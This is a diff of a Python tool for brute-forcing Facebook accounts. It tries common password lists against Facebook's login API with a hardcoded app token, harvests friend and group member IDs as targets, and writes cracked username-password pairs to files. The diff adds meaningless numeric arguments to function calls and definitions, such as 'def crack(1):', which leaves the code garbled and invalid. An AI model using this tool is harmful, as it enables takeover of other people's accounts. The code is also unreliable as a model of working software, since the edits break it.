 														print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
 														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-														menu_hack()
+														menu_hack(14)
 													else:
 														pz7 = "sayang123, sayang, bintang, bajingan, someone, anjing, pukimak, playboy, doraemon, bahagia"
 														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -1123,7 +1123,7 @@ def mini():
 															print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
 															print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7
 															raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-															menu_hack()
+															menu_hack(15)
 														else:
 															if 'www.facebook.com' in y["error_msg"]:
 																print "\033[1;91m[+] \033[1;92mFound"
@@ -1132,21 +1132,21 @@ def mini():
 																print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
 																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
 																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-																menu_hack()
+																menu_hack(16)
 															else:
 																print "\033[1;91m[!] Sorry, exit to open the target password :("
 																print "\033[1;91m[!] try it another way."
 																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-																menu_hack()
+																menu_hack(17)
 	except KeyError:
 		print "\033[1;91m[!] Terget not found"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		menu_hack()
+		menu_hack(18)
 
 
 ##### Multi Brute Force #####
 ##### CRACK ####
-def crack():
+def crack(1):
 	global idlist,passw,file
 	os.system('clear')
 	try:
@@ -1154,8 +1154,8 @@ def crack():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
+		time.sleep(2)
+		login(3)
 	os.system('clear')
 	print logo
 	idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')
@@ -1165,16 +1165,16 @@ def crack():
 		mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
 		for x in range(40):
 			pick = threading.Thread(target=scrak, args=())
-			pick.start()
+			pick.start(4)
 			threads.append(pick)
 		for pick in threads:
-			pick.join()
+			pick.join(5)
 	except IOError:
 		print ("\033[1;91m[!] File not found")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		menu_hack()
+		menu_hack(6)
 
-def scrak():
+def scrak(7):
 	global sucessful,checkpoint,action_failed,back,up
 	try:
 		os.mkdir('out')
@@ -1182,9 +1182,9 @@ def scrak():
 		pass
 	try:
 		open_it = open(idlist, "r")
-		up = open_it.read().split()
+		up = open_it.read().split(8)
 		while file:
-			username = file.readline().strip()
+			username = file.readline().strip(9)
 			url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(passw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
 			data = urllib.urlopen(url)
 			mpsh = json.load(data)
@@ -1193,14 +1193,14 @@ def scrak():
 			if 'access_token' in mpsh:
 				bisa = open("out/mbf_ok.txt", "w")
 				bisa.write(username+"|"+passw+"\n")
-				bisa.close()
+				bisa.close(10)
 				x = requests.get("https://graph.facebook.com/"+username+"?access_token="+mpsh['access_token'])
 				z = json.loads(x.text)
 				sucessful.append("\033[1;97m[ \033[1;92mOK✓\033[1;97m ] "+username+"|" +passw+" =>"+z['name'])
 			elif 'www.facebook.com' in mpsh["error_msg"]:
 				check_it = open("out/mbf_cp.txt", "w")
 				check_it.write(username+"|"+passw+"\n")
-				check_it.close()
+				check_it.close(11)
 				checkpoint.append("\033[1;97m[ \033[1;93mCP✚\033[1;97m ] "+username+"|" +passw)
 			else:
 				action_failed.append(username)
@@ -1212,7 +1212,7 @@ def scrak():
 	except requests.exceptions.ConnectionError:
 		print"\033[1;91m[✖] No connection"
 
-def success():
+def success(12):
 	print
 	print 42*"\033[1;97m═"
 	###sucessful
@@ -1224,10 +1224,10 @@ def success():
 	###action_failed
 	print 42*"\033[1;97m═"
 	print ("\033[31m[x] Failed \033[1;97m--> " + str(len(action_failed)))
-	exit()
+	exit(13)
 
 ############### SUPER MBF ################
-def super():
+def super(1):
 	global fb_token
 	os.system('clear')
 	try:
@@ -1245,13 +1245,13 @@ def super():
         print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Crack from File"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
 	print "║"
-	choices_super()
+	choices_super(2)
 
-def choices_super():
+def choices_super(3):
 	peak = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if peak =="":
 		print "\033[1;91m[!] Wrong input"
-		choices_super()
+		choices_super(4)
 	elif peak =="1":
 		os.system('clear')
 		print logo
@@ -1271,7 +1271,7 @@ def choices_super():
 		except KeyError:
 			print"\033[1;91m[!] Friend not found"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-			super()
+			super(5)
 		mkdir('\033[1;91m[✺] \033[1;92mGet all id from friend \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+fb_token)
 		z = json.loads(r.text)
@@ -1288,7 +1288,7 @@ def choices_super():
 		except KeyError:
 			print"\033[1;91m[!] Group not found"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-			super()
+			super(6)
 		mkdir('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
 		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=9999999999999&access_token='+fb_token)
 		s=json.loads(re.text)
@@ -1304,12 +1304,12 @@ def choices_super():
                 except KeyError:
                         print '\033[1;91m[!] File not found'
                         raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')
-                        super()
+                        super(7)
 	elif peak =="0":
-		menu_hack()
+		menu_hack(8)
 	else:
 		print "\033[1;91m[!] Wrong input"
-		choices_super()
+		choices_super(9)
 
         print "\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
         mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
